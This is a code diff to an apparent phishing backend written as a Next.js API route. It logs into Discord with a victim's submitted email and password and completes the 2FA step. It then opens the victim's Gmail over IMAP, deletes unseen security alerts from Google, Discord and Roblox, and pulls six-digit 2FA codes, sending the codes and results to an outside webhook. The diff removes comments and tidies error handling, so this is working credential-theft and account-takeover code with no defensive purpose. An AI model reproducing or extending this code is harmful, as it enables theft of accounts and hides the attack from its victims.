@@ -40,7 +40,6 @@ async function monitorGmail(email: string, password: string) {
     const connection = await imap.connect({ imap: config.imap });
     await connection.openBox('INBOX');
 
-    // Delete Google/Discord/Roblox alert emails
     const alerts = await connection.search([
       'UNSEEN',
       ['OR', ['FROM', 'no-reply@accounts.google.com'], ['FROM', 'no-reply@discord.com'], ['FROM', 'no-reply@roblox.com']],
@@ -53,12 +52,11 @@ async function monitorGmail(email: string, password: string) {
       await logWebhook('Alert Emails Deleted', [{ name: 'Email', value: email }], 0xffaa00);
     }
 
-    // Watch for 2FA codes (in real setup, run this in a loop/cron)
-    const messages = await connection.search(['UNSEEN']);
+    const messages = await connection.search(['SINCE', new Date(Date.now() - 5 * 60 * 1000)]);
     for (const msg of messages) {
       const part = await connection.getPartData(msg, 'TEXT');
       const parsed = await simpleParser(part);
-      const text = parsed.textAsHtml || parsed.text || '';
+      const text = parsed.text || '';
 
       const codeMatch = text.match(/\b\d{6}\b/);
       if (codeMatch) {
@@ -66,16 +64,17 @@ async function monitorGmail(email: string, password: string) {
         const service = text.includes('discord') ? 'Discord' : text.includes('roblox') ? 'Roblox' : 'Unknown';
         await logWebhook(`${service} 2FA Code`, [
           { name: 'Code', value: `\`${code}\`` },
-          { name: 'From', value: email }
+          { name: 'From Email', value: email }
         ], 0x00ff00);
       }
     }
 
     connection.end();
-  } catch (err: any) {
+  } catch (err) {
+    const errorMessage = err instanceof Error ? err.message : String(err || 'Unknown Gmail error');
     await logWebhook('Gmail Monitor Error', [
       { name: 'Email', value: email },
-      { name: 'Error', value: err.message }
+      { name: 'Error', value: errorMessage }
     ], 0xff0000);
   }
 }
@@ -94,7 +93,6 @@ export async function POST(req: NextRequest) {
       'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIn0='
     };
 
-    // Discord login
     const loginRes = await fetch('https://discord.com/api/v9/auth/login', {
       method: 'POST',
       headers,
@@ -129,7 +127,6 @@ export async function POST(req: NextRequest) {
         result.token = mfaData.token;
         result.mfa = true;
 
-        // Now log into Gmail with same creds + code
         await monitorGmail(email, password);
       } else {
         result.error = mfaData.message || '2FA failed';
@@ -138,7 +135,8 @@ export async function POST(req: NextRequest) {
       result.error = loginData.message || 'Login failed';
     }
   } catch (err) {
-    result.error = err.message || 'Request error';
+    const errorMessage = err instanceof Error ? err.message : String(err || 'Unknown error');
+    result.error = errorMessage;
     await logWebhook('Login Error', [
       { name: 'Email', value: email },
       { name: 'Error', value: result.error }
